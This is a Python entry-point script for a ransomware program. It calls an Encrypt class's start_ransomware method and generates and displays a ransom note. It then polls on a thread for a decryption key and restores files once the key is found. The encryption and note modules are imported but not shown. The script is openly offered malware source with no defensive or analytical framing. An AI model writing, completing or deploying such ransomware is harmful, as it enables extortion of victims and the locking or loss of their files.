import globals
import threading
from ransomNote import *
from encrypt import Encrypt
from decrypt import Decrypt

globals.found_key = False

if __name__ == '__main__':
	enc = Encrypt()
	enc.start_ransomware()

	dec = Decrypt()

	gen_ransomNote()
	globals.t1 = threading.Thread(target=show_ransomNote)
	globals.t2 =  threading.Thread(target=dec.check_decKey)

	globals.t1.start()
	globals.t2.start()

	while True:
		if globals.found_key:
			dec.decrypt_files()
			print("[+] All files have been restored!")
			break
